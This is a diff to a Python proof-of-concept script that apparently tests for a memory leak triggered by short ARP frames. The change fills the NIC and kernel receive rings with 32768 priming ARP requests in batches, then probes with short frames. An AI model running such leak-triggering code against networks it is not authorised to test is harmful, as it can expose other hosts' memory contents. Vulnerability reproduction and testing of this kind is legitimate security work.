@@ -84,15 +84,22 @@ if __name__ == "__main__":
     try:
         prime = prime_frame()
         short = short_arp()
-        # Fill and wrap the maximum 1024-entry single-queue RX ring with valid ARP requests. Their
-        # normal replies are drained so they cannot be mistaken for the leak.
-        for _ in range(1024):
-            sock.send(prime)
-        time.sleep(0.1)
-        primed = drain_prime_replies(8.0)
-        if primed != 1024:
-            raise SystemExit(f"FAIL: drained {primed} of 1024 full ARP priming replies")
-        print(f"OBSERVED: drained {primed} normal replies to full ARP priming requests")
+        # The device RX queue is capped at 1024 descriptors, while the
+        # per-CPU software ring can hold up to 32768 frames. Send 32768
+        # identical valid ARP requests in bounded batches so both rings wrap.
+        # Drain each batch's normal replies before continuing.
+        total_primed = 0
+        for batch in range(64):
+            for _ in range(512):
+                sock.send(prime)
+            time.sleep(0.02)
+            primed = drain_prime_replies(4.0)
+            if primed != 512:
+                raise SystemExit(
+                    f"FAIL: batch {batch + 1}/64 drained {primed} of 512 full ARP replies"
+                )
+            total_primed += primed
+        print(f"OBSERVED: drained {total_primed} normal replies to full ARP priming requests")
         found = False
         for _ in range(128):
             sock.send(short)
